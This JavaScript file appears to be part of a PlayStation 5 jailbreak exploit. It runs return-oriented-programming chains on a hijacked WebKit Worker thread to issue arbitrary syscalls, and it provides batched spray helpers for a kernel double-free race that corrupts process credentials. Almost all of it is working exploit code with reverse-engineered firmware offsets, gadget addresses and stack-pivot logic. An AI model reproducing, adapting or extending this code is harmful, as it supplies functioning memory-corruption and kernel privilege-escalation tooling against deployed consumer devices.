/* rop-worker.js — chain runner on a sacrificial Worker thread.
 *
 * WHY
 * ---
 * lapse-runtime's runChain is fatal on 10.00. Proven on hardware: getpid(),
 * zero arguments, kills the renderer exactly like a 5-arg syscall. Both
 * window.syscall and window.call route through it, so the port had no path to
 * the kernel at all.
 *
 * The kernel is innocent. Xfast_syscall (0xFFFFFFFF80461710, found via the
 * LSTAR MSR write) stashes user RSP as a VALUE - `mov gs:[0x7a8], rsp` - then
 * switches to the kernel stack. It never dereferences it, and performs no
 * caller or stack validation. A pivoted RSP is legal.
 *
 * runChain dies because it (a) runs on the RENDERER MAIN THREAD and (b) exits
 * via `mov rsp,rbp; pop rbp; ret`, unwinding to whatever frame RBP described
 * inside ICU's collator compare. So: run on a Worker, exit via longjmp.
 *
 * EVERY CONSTANT BELOW IS RE'd FROM THE DEVKIT 10.00 MODULES, and the live
 * survey confirmed the thread walk on hardware (10 threads, one 0x80000 stack).
 */
"use strict";

(function () {

/* ---------------------------------------------------------- RE'd offsets */

// libkernel_web. IDA: `for (j = qword_64218; j; j = j[7])` with j[21]/j[22]
// read as stack addr/size. A sibling list at 0x64228 links via +0x48 over the
// same struct (libthr's _thread_gc_list), which is what makes these field
// offsets trustworthy rather than coincidental.
const LK_THREAD_LIST  = 0x64218n;
const PTHREAD_NEXT    = 0x38n;
const PTHREAD_STACK   = 0xA8n;
const PTHREAD_STACKSZ = 0xB0n;

// setjmp/longjmp, recovered by signature (the lapse-offsets values pointed at
// DATA). Disassembled on 10.00, so the jmp_buf layout below is measured:
//   +0x00 rip  +0x08 rbx  +0x10 rsp  +0x18 rbp
//   +0x20 r12  +0x28 r13  +0x30 r14  +0x38 r15  +0x40 fcw
// longjmp ends `mov [rsp], rcx ; ret`, i.e. it writes the target rip AT the
// restored rsp - so pointing ctx.rsp at the hijacked slot makes it repair that
// slot on the way out.
const LK_SETJMP  = 0x1CB43n;
const LK_LONGJMP = 0x1CB9Cn;
const JB_RIP = 0x00n, JB_RSP = 0x10n;

const LK_POP_RSP = 0x343AAn;   // byte scan (5C C3)
const LK_TEXT_SIZE = 0x43190n;

// umtx2's worker hint. CONFIRMED on 10.00 by the live survey: of 10 threads,
// exactly one had a 0x80000 stack; the rest were 0x10000 / 0x200000.
const WORKER_STACK_SIZE = 0x80000n;

/* Hijack slot, from the live survey + IDA.
 *
 * The parked worker's stack holds cond_wait's return address at stack+0x7fc18
 * (-> libkernel+0x190db). sub_1F110 is pthread_cond_wait, identified by its
 * "[ScePthread] Error: This condvar is already destroyed" string, so this is
 * the FIRST frame to unwind when postMessage signals - our chain runs before
 * any WebKit code touches the stack.
 *
 * Verified at runtime anyway (see fire()): a hardcoded stack offset is exactly
 * the kind of measured constant that rots across firmware. */
const SLOT_OFF      = 0x7FC18n;
const SLOT_EXPECT   = 0x190DBn;   // libkernel RVA the slot must contain

/* HARD INVARIANT — do not reorder the chain.
 *
 * At libkernel+0x190f2/0x190f5 the resume site does `mov rsi, rbx` and
 * `mov rdi, r14` and passes both to sub_1F9E0 BEFORE its `pop rbx; pop r14`.
 * So rbx and r14 are LIVE across the cond_wait call. longjmp restores
 * rbx/rbp/r12-r15 from the jmp_buf, so the jmp_buf must contain the WORKER's
 * values, not ours - which it does only if setjmp runs before anything that
 * clobbers a callee-saved register. `pop rsp` and `pop rdi` are safe (rsp is
 * reloaded by longjmp, rdi is caller-saved); nothing else may precede setjmp.
 */

const JMPBUF_SIZE = 0x48;
const CHAIN_CAP   = 0x380;
/* Batched chains get their own, much larger buffer from the worker-stack
 * arena. 150 setsockopt calls = 150 * (5 pops + 1 call) = 1650 qwords, far
 * past CHAIN_CAP - and the spray is where all the time goes: find_twins does
 * 300 syscalls a round at ~0.215 ms each (~65 ms), so the 5000-round budget is
 * 5.4 minutes. Issuing the whole spray as ONE chain makes it one round trip. */
const BATCH_CAP   = 0x8000;

/* ----------------------------------------------------------------- state */

const W = {
    ready: false, kbase: 0n, wbase: 0n, gadgets: null,
    worker: null, threads: [], stack: 0n, stacksz: 0n,
    ctx: 0n, retval: 0n, chainBuf: 0n,
    slot: 0n, origRet: 0n, origNext: 0n,
    fired: 0,
};

function log(m) {
    if (window.slopkit && window.slopkit.mark) window.slopkit.mark("RW " + m);
    else if (window.jb && typeof window.jb.mark === "function") window.jb.mark("RW", String(m));
    else console.log("[rop-worker] " + m);
}
const hex = (v) => "0x" + BigInt(v).toString(16);
const rd64 = (a) => BigInt(window.read64(a));
const wr64 = (a, v) => window.write64(a, BigInt(v));

// per-fw libkernel_web offset, from init cfg.lk if given, else the netctrl default
function LKV(key, dflt) {
    return (W.lk && W.lk[key] !== undefined) ? BigInt(W.lk[key]) : BigInt(dflt);
}

function g(name) {
    // pop_rsp: prefer a caller-supplied absolute (webkit) address — libkernel_web
    // dropped `5C C3` in 12.xx, so kbase+LK_POP_RSP is invalid there.
    if (name === "pop_rsp" && W.gadgets && W.gadgets.pop_rsp !== undefined)
        return BigInt(W.gadgets.pop_rsp);
    switch (name) {
        case "pop_rsp": return W.kbase + LKV("pop_rsp", LK_POP_RSP);
        case "setjmp":  return W.kbase + LKV("setjmp", LK_SETJMP);
        case "longjmp": return W.kbase + LKV("longjmp", LK_LONGJMP);
        case "syscall_wrapper": return W.kbase + LKV("syscall_wrapper", 0x1A5B7n);
    }
    const v = W.gadgets && W.gadgets[name];
    if (v === undefined) throw new Error("rop-worker: gadget '" + name + "' missing");
    return BigInt(v);
}

/* --------------------------------------------------------------- threads */

function spawnWorker() {
    if (!W.worker) W.worker = new Worker("rop_slave.js");
    return W.worker;
}

function ping(ms) {
    return new Promise((resolve, reject) => {
        const t = setTimeout(() => reject(new Error("worker timeout")), ms || 4000);
        W.worker.onmessage = () => { clearTimeout(t); resolve(true); };
        W.worker.postMessage(0);
    });
}

function enumerate(limit) {
    const out = [];
    const tlAddr = W.kbase + LKV("thread_list", LK_THREAD_LIST);
    log("ENUM kbase=" + hex(W.kbase) + " tl@" + hex(tlAddr) + " scratch=" + hex(W.ctx));
    let t = rd64(tlAddr), n = 0;
    log("ENUM head=" + hex(t));
    while (t !== 0n && n < (limit || 64)) {
        // node must be a plausible userland pointer (>4GB, 8-aligned) before deref
        if (t < 0x100000000n || (t & 7n) !== 0n) {
            log("ENUM BAD-NODE n=" + n + " t=" + hex(t) + " (aborting walk)");
            break;
        }
        const st = rd64(t + LKV("pthread_stack", PTHREAD_STACK));
        const sz = rd64(t + LKV("pthread_stacksz", PTHREAD_STACKSZ));
        if (sz === WORKER_STACK_SIZE) log("ENUM n=" + n + " t=" + hex(t) + " stack=" + hex(st) + " size=" + hex(sz) + " <== 0x80000");
        out.push({ pthread: t, stack: st, size: sz });
        t = rd64(t + LKV("pthread_next", PTHREAD_NEXT));
        n++;
    }
    log("ENUM done n=" + n);
    return (W.threads = out);
}

function findWorkerStack() {
    for (const t of enumerate())
        if (t.size === WORKER_STACK_SIZE) { W.stack = t.stack; W.stacksz = t.size; return t; }
    throw new Error("rop-worker: no 0x80000 stack among "
                    + W.threads.length + " threads");
}

/* ----------------------------------------------------------- chain build */

function Chain() { this.q = []; }
Chain.prototype.raw  = function (v) { this.q.push(BigInt(v)); return this; };
Chain.prototype.pop  = function (r, v) { return this.raw(g("pop_" + r)).raw(v); };
Chain.prototype.call = function (a) { return this.raw(a); };
// store an immediate to an absolute address, using the verified
// `mov qword [rdi], rax ; ret` gadget
Chain.prototype.store = function (addr, val) {
    return this.pop("rax", val).pop("rdi", addr).raw(g("mov_qword_rdi_rax"));
};
Chain.prototype.commit = function (at, cap) {
    const n = this.q.length * 8;
    const lim = cap || CHAIN_CAP;
    if (n > lim) throw new Error("rop-worker: chain " + n + " > cap " + lim);
    for (let i = 0; i < this.q.length; i++) wr64(at + BigInt(i * 8), this.q[i]);
    return at;
};

/* Wrap a payload with the setjmp prologue and longjmp epilogue.
 * See the HARD INVARIANT above: setjmp is first, always. */
function wrap(payload, withDone) {
    const c = new Chain();
    c.pop("rdi", W.ctx).call(g("setjmp"));        // FIRST. captures worker regs
    payload(c);
    // ordering matters: result is already stored by the payload; publish the
    // completion flag only afterwards so a poller never sees a half-written
    // result (window.read64 is byte-wise and not atomic).
    if (withDone) c.store(W.done, DONE_MAGIC);
    // patch the captured context so longjmp resumes the worker cleanly
    c.store(W.ctx + JB_RIP, W.origRet);           // resume at cond_wait's caller
    c.store(W.ctx + JB_RSP, W.slot);              // rsp -> slot; longjmp writes
                                                  //   rip there and rets
    c.store(W.slot + 8n, W.origNext);             // restore the word we used
                                                  //   to feed `pop rsp`
    c.pop("rdi", W.ctx).pop("rsi", 1n).call(g("longjmp"));
    return c;
}

/* ------------------------------------------------------------------ fire */

// Locate the parked cond_wait return slot. slot_off is a RUNTIME stack depth, not
// a module offset — so unless lk.slot_off is supplied, scan the top of the 0x80000
// worker stack for the qword == kbase+slot_expect (the parked resume address). No
// guessing: the value is the RE'd slot_expect, the address is found live.
function resolveSlot() {
    if (W.slotAddr !== undefined) { W.slot = W.slotAddr; return; }
    if (!W.stack) findWorkerStack();
    const want = W.kbase + LKV("slot_expect", SLOT_EXPECT);
    if (W.lk && W.lk.slot_off !== undefined) {
        W.slotAddr = W.stack + BigInt(W.lk.slot_off);
        if (rd64(W.slotAddr) !== want)
            throw new Error("rop-worker: lk.slot_off wrong; slot holds libkernel+"
                            + hex(rd64(W.slotAddr) - W.kbase));
    } else {
        /* SCAN DIRECTION MATTERS - this used to run low->high and take the FIRST hit,
         * which is the worst choice available.
         *
         * The stack grows DOWN from `top`. The live parked frame is the deepest ACTIVE
         * frame, so it sits at the LOW edge of the active region; everything below it is
         * dead stack left by earlier, deeper excursions. A stale copy of slot_expect in
         * that dead stack therefore has a LOWER address than the live one - and the old
         * loop, starting at top-0x8000 and breaking on the first match, preferred exactly
         * that stale copy. Hijacking dead stack means the worker returns through its real
         * slot, `done` is never written, and fireSync spins out its whole cap: the wedge.
         *
         * So scan HIGH->LOW and prefer the highest match, and additionally verify each
         * candidate against the callee's real prologue. From the 12.00 libkernel_web
         * disassembly, slot_expect (0x197FB on 12.00) is the return address of
         * `call 0x1faf0`, and 0x1faf0 opens with
         *     push rbp ; mov rbp, rsp ; push r15 ; push r14 ; push r13 ; push r12 ; push rbx
         * so for a genuine frame at A the qword at A-8 is the CALLER's saved rbp, which
         * must be a stack address above A and inside this stack. Dead stack almost never
         * satisfies that, making it a cheap and precise liveness test.
         *
         * The validation is ADVISORY: if nothing validates we still fall back to the
         * highest match rather than throwing, so a wrong assumption here can only ever
         * leave us where the old code was, never worse. With a single match - the healthy
         * case, and what all six 12.x preflights showed - the result is identical. */
        const top = W.stack + WORKER_STACK_SIZE;
        const lo = top - 0x8000n;
        let best = 0n, bestValidated = 0n, matches = 0;
        for (let a = top - 8n; a >= lo; a -= 8n) {
            if (rd64(a) !== want) continue;
            matches++;
            if (best === 0n) best = a;                  // highest match
            if (bestValidated === 0n) {
                const savedRbp = rd64(a - 8n);          // callee pushes rbp first
                if (savedRbp > a && savedRbp < top && (savedRbp & 7n) === 0n)
                    bestValidated = a;                  // highest match with a live frame
            }
        }
        if (best === 0n)
            throw new Error("rop-worker: parked slot (kbase+" + hex(LKV("slot_expect", SLOT_EXPECT))
                            + ") not found in worker stack top — worker not parked or slot_expect wrong");
        W.slotMatches = matches;
        W.slotValidated = bestValidated !== 0n;
        W.slotAddr = bestValidated !== 0n ? bestValidated : best;
        // A count > 1 is exactly the condition that used to produce a silent wedge, so
        // make it visible instead. Quiet in the trivial healthy case.
        if (matches !== 1 || bestValidated === 0n) {
            try {
                const m = "matches=" + matches + " picked=" + hex(W.slotAddr)
                        + " highest=" + hex(best)
                        + " validated=" + (bestValidated !== 0n ? hex(bestValidated) : "none");
                if (typeof window.syncMark === "function") window.syncMark("RW-SLOT", m);
                else log("SLOT " + m);
            } catch (e) { }
        }
    }
    W.slot = W.slotAddr;
}

async function fire(payload, timeoutMs) {
    if (!W.ready) throw new Error("rop-worker: init() first");
    if (!W.stack) findWorkerStack();

    resolveSlot();
    W.origRet  = rd64(W.slot);
    W.origNext = rd64(W.slot + 8n);

    const chain = wrap(payload).commit(W.chainBuf);
    wr64(W.retval, 0n);

    wr64(W.slot, g("pop_rsp"));   // cond_wait's ret lands here
    wr64(W.slot + 8n, chain);     // pop rsp loads this

    const t0 = Date.now();
    await ping(timeoutMs || 5000);
    W.fired++;
    return { ms: Date.now() - t0, retval: rd64(W.retval) };
}

/* ------------------------------------------------- SYNCHRONOUS execution
 *
 * netctrl-ps5.js is synchronous throughout (`sys.read(...)` returns a number)
 * and its race spins thousands of iterations, so an await per syscall would
 * mean a full async refactor AND would wreck the timing the triple-free
 * depends on. So do not await: let the chain write the result, and busy-poll
 * it from the main thread.
 *
 * Why that is sound, from RE rather than hope:
 *   * the worker is blocked in the KERNEL on a condvar - webkit+0x3E1D0 is a
 *     WTF::Condition wrapper calling pthread_cond_wait / _timedwait;
 *   * libkernel's _umtx_op is a leaf syscall stub (`mov rax,0x1c6 ; syscall ;
 *     ret` at 0x1CC40), so both sleeping and waking happen inline on the
 *     calling thread;
 *   * therefore postMessage's notify is a syscall executed by US, and the
 *     worker becomes runnable on another core immediately - the main thread
 *     never has to yield for it to run.
 *
 * Bounded, and reports how long it took, so a wrong assumption shows up as a
 * clean timeout instead of a hang.
 */
/* The result slot CANNOT be polled directly. window.read64 is not atomic - it
 * reads eight separate bytes through the carrier - so a poll that races the
 * chain's store returns a spliced value. That is not hypothetical: a run
 * returned 0x00ADBEEFDEADBEEF, i.e. seven bytes of the old sentinel plus the
 * top byte of the new result (pid 218 = 0x...DA, high byte 0x00).
 *
 * So the chain writes the RESULT first and a DONE flag second, and we poll the
 * flag. A torn read of the flag can only mix zero bytes with magic bytes and
 * therefore never equals the magic, so the value is only read once it is
 * settled. The async path never hit this because await guarantees ordering. */
const DONE_MAGIC = 0x5A17C0DEF00D1234n;

function fireSync(payload, big, spins) {
    if (!W.ready) throw new Error("rop-worker: init() first");
    // Latched by the wedge handler below. Without this, a dead executor costs a FULL cap
    // (~135s) per call, and the unwind path issues many - minutes of the kernel sitting
    // half-corrupted for calls that cannot succeed. Fail out immediately instead.
    if (W.dead) throw new Error("rop-worker: executor is dead (wedged earlier) - refusing to spin");
    if (!W.stack) findWorkerStack();

    resolveSlot();
    if (!W._dumped) {
        W._dumped = 1;
        log("FS stack=" + hex(W.stack) + " kbase=" + hex(W.kbase) + " ctx=" + hex(W.ctx)
            + " retval=" + hex(W.retval) + " done=" + hex(W.done) + " chainBuf=" + hex(W.chainBuf)
            + " slot=" + hex(W.slot) + " worker=" + (W.worker ? "obj" : "null")
            + " gpop_rsp=" + hex(g("pop_rsp")) + " gsysw=" + hex(g("syscall_wrapper")));
    }

    /* Wait for the worker to be parked again before touching the slot.
     *
     * fireSync returns as soon as the chain publishes the DONE flag, which
     * happens BEFORE the longjmp runs and before the worker unwinds back into
     * cond_wait. Firing again in that window hijacks a slot the worker is
     * still using - a run threw "slot holds libkernel+0x7f6f76000" (a JS heap
     * pointer) because it read the frame mid-transition. Harmless in the
     * getpid tests, guaranteed to bite once the race issues syscalls
     * back-to-back.
     *
     * The slot is self-repairing: longjmp ends `mov [rsp], rcx ; ret` with rsp
     * pointing at it, so the original return address reappears once the worker
     * is home. Spin for that rather than assuming it. */
    const want = W.kbase + LKV("slot_expect", SLOT_EXPECT);

    /* Capture the PRISTINE frame exactly once.
     *
     * This used to re-read origNext on every fire, which is a corruption bug:
     * caught mid-unwind it captures OUR OWN previous chain pointer, and the
     * next chain then faithfully "restores" that into the worker's stack. The
     * real value never changes, so read it once while the worker is known
     * parked and reuse it forever. */
    if (W.pristineNext === undefined) {
        for (let i = 0; i < 2000000 && rd64(W.slot) !== want; i++) { /* park */ }
        if (rd64(W.slot) !== want)
            throw new Error("rop-worker: worker never parked for first capture");
        W.pristineRet = rd64(W.slot);
        W.pristineNext = rd64(W.slot + 8n);
    }

    /* Seeing the return address reappear is NOT proof the worker is parked.
     * longjmp restores the slot with `mov [rsp], rcx ; ret` - the value is back
     * while the worker is still executing that very ret. Overwriting the slot
     * in that window makes it pivot straight into the next chain with no
     * postMessage, mid-unwind, which is the renderer SIGSEGV we kept hitting
     * under sustained syscall load (thousands of back-to-back fires in
     * find_triplet).
     *
     * So require BOTH words to match the pristine frame, and require them to
     * stay matched across consecutive samples - the worker has to be far
     * enough past the ret that slot+8 is its own data again, not our chain. */
    /* 8, not 64. Each sample is two rd64 calls through the WebKit read
     * primitive at ~6 us each, so the count is paid on EVERY syscall: 64
     * samples measured 0.985 ms/syscall against 0.220 ms before, pushing
     * find_twins' worst case from 34 s to 151 s. That matters because the
     * whole reason for hurrying is the ucred being corrupt while we spray -
     * a slower chain is a wider panic window.
     *
     * What we actually need is confirmation that slot+8 holds the worker's own
     * data rather than our chain pointer, i.e. that it is past the
     * `mov [rsp],rcx ; ret`. A few consecutive agreeing samples establish that;
     * 64 was arbitrary caution. Check the cheap word first and only look at
     * slot+8 once it matches. */
    /* STABLE=8, BOTH words re-checked every sample. This exact configuration
     * is the one that produced a working jailbreak with no renderer crash.
     *
     * Tried and rejected:
     *   STABLE=64, both words  - safe but 0.985 ms/syscall; the widened ucred
     *                            exposure window then caused a KERNEL panic.
     *   STABLE=4, slot+8 confirmed ONCE then only slot re-checked - faster
     *                            (0.225 ms) but the renderer SIGSEGV returned
     *                            (cause:11, dump NPXS40087_1786156077).
     *                            slot+8 is the word that carries the
     *                            information - checking it once is not enough,
     *                            because the worker can still be mid-unwind
     *                            when slot alone looks right.
     * ~0.32 ms/syscall is the price of not corrupting the Worker. */
    const STABLE = 8;
    let settled = false, stable = 0;
    for (let i = 0; i < 4000000; i++) {
        if (rd64(W.slot) === want && rd64(W.slot + 8n) === W.pristineNext) {
            if (++stable >= STABLE) { settled = true; break; }
        } else {
            stable = 0;
        }
    }
    if (!settled) {
        const rva = rd64(W.slot) - W.kbase;
        throw new Error("rop-worker: slot never settled, holds libkernel+"
                        + hex(rva) + " next=" + hex(rd64(W.slot + 8n))
                        + ", expected +" + hex(SLOT_EXPECT)
                        + " next=" + hex(W.pristineNext));
    }

    W.origRet = W.pristineRet;
    W.origNext = W.pristineNext;

    wr64(W.retval, 0n);
    wr64(W.done, 0n);
    let buf = W.chainBuf, chainCap = CHAIN_CAP;
    if (big) {
        if (!W.batchBuf) W.batchBuf = alloc(BATCH_CAP);
        buf = W.batchBuf; chainCap = BATCH_CAP;
    }
    const chain = wrap(payload, /*withDone=*/true).commit(buf, chainCap);

    // swallow the worker's reply; we are not awaiting it
    W.worker.onmessage = function () {};

    wr64(W.slot, g("pop_rsp"));
    wr64(W.slot + 8n, chain);
    W.worker.postMessage(0);          // wake syscall happens on THIS thread

    const cap = spins || 20000000;
    const t0 = Date.now();
    for (let i = 0; i < cap; i++) {
        if (rd64(W.done) === DONE_MAGIC) {
            W.fired++;
            return { retval: rd64(W.retval), spins: i };
        }
    }

    /* WEDGE. The executor stopped completing chains and is not coming back.
     *
     * Timing/semantics of the loop above are deliberately UNCHANGED: chains carry
     * syscalls that legitimately block (kread_slow does socket read()s), so a wall-clock
     * bound would abort healthy work. Everything below runs only after the cap is spent.
     *
     * Why this block exists: a wedge used to produce one bare message and nothing else,
     * and EVERY later syscall then burned another full cap (~135s each) before failing
     * the same way - the kernel sits in a half-corrupted state that whole time. Worse,
     * the caller cannot tell "worker never woke" from "chain ran and crashed", which is
     * exactly what a diagnosis needs. So: classify, report synchronously, and latch. */
    W.dead = true;
    let slotNow = 0n, nextNow = 0n, doneNow = 0n, retNow = 0n;
    try {
        slotNow = rd64(W.slot); nextNow = rd64(W.slot + 8n);
        doneNow = rd64(W.done); retNow = rd64(W.retval);
    } catch (e) { }

    // Which of the three failure shapes is it? This is the whole point of the dump.
    let shape = "UNKNOWN";
    try {
        if (slotNow === W.pristineRet && nextNow === W.pristineNext)
            shape = "PARKED-AGAIN(worker returned to its wait; chain ran or was never taken)";
        else if (slotNow === g("pop_rsp"))
            shape = "NEVER-CONSUMED(worker never picked up the hijacked slot)";
        else
            shape = "SLOT-CLOBBERED(neither pristine nor our pivot - stack corrupted)";
    } catch (e) { }

    // MUST be synchronous: the main thread never returned to the event loop during the
    // spin, so a queued beacon would be lost if the page dies before it flushes.
    const dump = "shape=" + shape
        + " slot=" + hex(slotNow) + " next=" + hex(nextNow)
        + " expectSlot=" + hex(W.pristineRet || 0n) + " expectNext=" + hex(W.pristineNext || 0n)
        + " done=" + hex(doneNow) + " retval=" + hex(retNow)
        + " fired=" + W.fired + " cap=" + cap + " ms=" + (Date.now() - t0)
        + " kbase=" + hex(W.kbase);
    try {
        if (typeof window.syncMark === "function") window.syncMark("RW-WEDGE", dump);
        else log("WEDGE " + dump);
    } catch (e) { }

    throw new Error("rop-worker: sync poll timed out after " + cap + " spins [" + dump + "]");
}

/* Run many syscalls in ONE worker round trip.
 * calls = [[num, a1..a5], ...]. Return values are discarded - this exists for
 * fire-and-forget sprays (setsockopt) and for probes that write their result
 * into caller-supplied buffers (getsockopt), which is every hot loop we have.
 * One round trip instead of N turns a 65 ms find_twins round into about 1 ms. */
function syscallBatch(calls) {
    if (!calls.length) return 0;
    return fireSync((c) => {
        const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
        for (const call of calls) {
            for (let i = 0; i < 5; i++)
                if (call[i + 1] !== undefined) c.pop(regs[i], call[i + 1]);
            c.pop("rax", BigInt(call[0])).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

/* Spray helper: for each item [storeAddr, storeVal, arg1] the chain STORES
 * storeVal at storeAddr and then issues syscall(num, arg1, a2, a3, a4, a5).
 * Lets one chain tag-and-spray N sockets from a single shared buffer, which is
 * otherwise impossible - every call in a batch sees the buffer as it is when
 * the chain runs, not when it was built. */
function syscallBatchTagged(items, num, a2, a3, a4, a5) {
    if (!items.length) return 0;
    return fireSync((c) => {
        for (const [addr, val, a1] of items) {
            c.store(addr, val);
            c.pop("rdi", a1);
            if (a2 !== undefined) c.pop("rsi", a2);
            if (a3 !== undefined) c.pop("rdx", a3);
            if (a4 !== undefined) c.pop("rcx", a4);
            if (a5 !== undefined) c.pop("r8", a5);
            c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

/* Run ONE leading syscall (lead = [num, a1, a2, ...]) then the tagged spray, all
 * in the SAME chain / one worker wake. Purpose: put the double-free (close) and
 * the rthdr spray in one wake so they run on the SAME core - the freed chunk
 * lands in that core's per-CPU bucket and the same-core spray reclaims it,
 * defeating the park/migrate-between-syscalls that produces self=all. Sound only
 * because every batched syscall is non-blocking (rthdr setsockopt = M_NOWAIT,
 * close = non-blocking; RE'd) so the worker never parks mid-chain. */
function leadThenBatchTagged(lead, items, num, a2, a3, a4, a5) {
    if (!items.length) return 0;
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    return fireSync((c) => {
        if (lead && lead.length) {
            for (let i = 1; i < lead.length && i <= 5; i++)
                if (lead[i] !== undefined) c.pop(regs[i - 1], lead[i]);
            c.pop("rax", BigInt(lead[0])).call(g("syscall_wrapper"));
        }
        for (const [addr, val, a1] of items) {
            c.store(addr, val);
            c.pop("rdi", a1);
            if (a2 !== undefined) c.pop("rsi", a2);
            if (a3 !== undefined) c.pop("rdx", a3);
            if (a4 !== undefined) c.pop("rcx", a4);
            if (a5 !== undefined) c.pop("r8", a5);
            c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

// SIX arguments. mmap is (addr,len,prot,flags,fd,offset) and the 6th goes in r9; with
// only five the offset was never set and the kernel saw garbage, which fails sys_mmap's
// "offset must be 0" test on the MAP_ANON path and the 16K-alignment test elsewhere -
// EVERY p2jb mmap returned EINVAL. The header note above claiming there is no usable
// `pop r9` is wrong for the poops gadget set (offsets/12.00.js has "pop r9": 0xFFFF6);
// the adapter now passes it as gadgets.pop_r9. a6 stays optional so 5-arg callers and
// any firmware whose gadget map lacks pop r9 behave exactly as before.
function syscallSync(num, a1, a2, a3, a4, a5, a6) {
    const args = [a1, a2, a3, a4, a5, a6];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
    return fireSync((c) => {
        for (let i = 0; i < 6; i++)
            if (args[i] !== undefined) c.pop(regs[i], args[i]);
        c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
    });
}

/* One syscall, result stored to W.retval by the chain itself. */
async function syscall(num, a1, a2, a3, a4, a5) {
    const args = [a1, a2, a3, a4, a5];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    const r = await fire((c) => {
        for (let i = 0; i < 5; i++)
            if (args[i] !== undefined) c.pop(regs[i], args[i]);
        c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
    });
    return r;
}

/* ------------------------------------------------------- bump allocator
 *
 * netctrl-ps5 needs ~300 KB (thread stacks, ROP chains, spray buffers) and has
 * no way to get it:
 *   * window.malloc serves 248 bytes from lapse-runtime's arena and then takes
 *     a slab path through runChain, which is fatal on 10.00;
 *   * get_backing_store needs lapse-runtime's addrof, which bootstraps by
 *     scanning targetHolder for known slot addresses - those are gone by the
 *     time we run, and the armed run threw exactly that
 *     ("addrof: bootstrap could not find any known slot in targetHolder");
 *   * mmap is 6-arg and there is no usable `pop r9` anywhere in
 *     libSceNKWebKit or libkernel_web (the three `pop r9` sites are followed by
 *     privileged out/in instructions). Its MAP_ANON path only ignores `pos` on
 *     one side of a per-process branch, so garbage r9 is a coin flip.
 *
 * But we already have a large mapped writable region at a known address: the
 * worker's own 0x80000 stack. Its parked frames live in the top few KB
 * (0x7f918..0x7ffc8 measured on hardware); the worker only ever runs a trivial
 * onmessage echo, so the bottom never gets used. Carve from there.
 *
 * Deliberately conservative: allocation stops well below the deepest observed
 * frame, and the allocator refuses rather than encroaching. */
const STACK_ARENA_LIMIT = 0x70000n;   // bottom 448 KB; frames start ~0x7f900
let stackBump = 0x1000n;              // leave the guard page alone

function alloc(size) {
    if (!W.stack) findWorkerStack();
    const n = (BigInt(size) + 15n) & ~15n;          // 16-byte aligned
    if (stackBump + n > STACK_ARENA_LIMIT)
        throw new Error("rop-worker: stack arena exhausted ("
                        + stackBump + " + " + n + " > " + STACK_ARENA_LIMIT + ")");
    const p = W.stack + stackBump;
    stackBump += n;
    return p;
}
function allocReset() { stackBump = 0x1000n; }
function allocUsed() { return Number(stackBump); }

/* ------------------------------------------------------------------- api */

function init(cfg) {
    W.kbase = BigInt(cfg.kernelBase);
    W.wbase = BigInt(cfg.webkitBase || 0);
    W.gadgets = cfg.gadgets || {};
    // per-fw libkernel_web offsets (setjmp/longjmp/pop_rsp/syscall_wrapper/thread_list/
    // slot_off/slot_expect/pthread_*). Defaults below are netctrl's fw; 12.xx must override.
    W.lk = cfg.lk || {};
    // CHAIN LAYOUT - the reserve below the entry is LOAD-BEARING.
    //
    // This used to be:
    //     W.ctx      = s;                       jmp_buf
    //     W.retval   = s + JMPBUF_SIZE;
    //     W.done     = s + JMPBUF_SIZE + 8;
    //     W.chainBuf = s + JMPBUF_SIZE + 0x20;  <- chain ~0x70 bytes above the base
    // i.e. the chain entry sat just above the jmp_buf with NOTHING reserved beneath
    // it. rsp starts at the chain entry and CLIMBS as the chain pops, so anything the
    // chain CALLS pushes DOWNWARD from there - straight into W.ctx/W.retval/W.done.
    // A syscall stub (`mov rax,NR; mov r10,rcx; syscall; ret`) pushes nothing and was
    // therefore always fine; so was a bare `ret` (v94's XCALL). The FIRST compiled
    // function - scePthreadAttrInit's `push rbp` + `call` - overwrote the jmp_buf, and
    // the process then died when the chain finished and longjmp'd through it. That is
    // why the crash never pointed at the call site, and why two different fatal codes
    // were seen (0xa0020307 from a smashed context vs a plain 0xb).
    //
    // poopsploit's rop class has always done this correctly:
    //     constructor(p, stack_size = 0x80000, reserved_stack = 0x10000)
    //     this.stack_entry_point = this.stack_memory.add32(this.reserved_stack);
    // 64KB of push space BELOW the entry. WORKING.txt recorded this exact lesson for
    // the RACER chains in v64 ("the reserve is where anything the chain CALLS pushes")
    // and it was never applied here.
    //
    // New layout: reserve first, then the chain, then the bookkeeping slots ABOVE the
    // chain where a callee's pushes can never reach them.
    const s = BigInt(cfg.scratch);
    const CALL_RESERVE = 0x10000n;                    // match poops's reserved_stack
    W.chainBuf = s + CALL_RESERVE;                    // chain entry
    W.ctx      = s + CALL_RESERVE + BigInt(CHAIN_CAP) + 0x100n;   // jmp_buf, ABOVE the chain
    W.retval   = W.ctx + BigInt(JMPBUF_SIZE);         // 8 bytes
    W.done     = W.retval + 8n;                       // completion flag
    // scratch must cover reserve + chain + slack + jmp_buf + 16; the adapter allocates
    // 0x20000, which leaves room to spare. Fail loudly rather than corrupt silently.
    if (BigInt(cfg.scratchSize || 0) && BigInt(cfg.scratchSize) < (W.done + 16n - s))
        throw new Error("rop-worker: scratch too small for the call reserve ("
                        + cfg.scratchSize + " < " + (W.done + 16n - s) + ")");
    W.ready = true;
    return W;
}

async function survey() {
    spawnWorker();
    await ping(4000);
    log("survey: worker alive and parked");
    const th = enumerate();
    log("survey: " + th.length + " threads");
    for (const t of th)
        log("  thr=" + hex(t.pthread) + " stack=" + hex(t.stack)
            + " size=" + hex(t.size)
            + (t.size === WORKER_STACK_SIZE ? "  <-- worker" : ""));
    const w = findWorkerStack();
    const slot = w.stack + SLOT_OFF;
    const val = rd64(slot);
    log("survey: slot " + hex(slot) + " = libkernel+" + hex(val - W.kbase)
        + (val - W.kbase === SLOT_EXPECT ? "  MATCH" : "  *** UNEXPECTED ***"));
    return W;
}

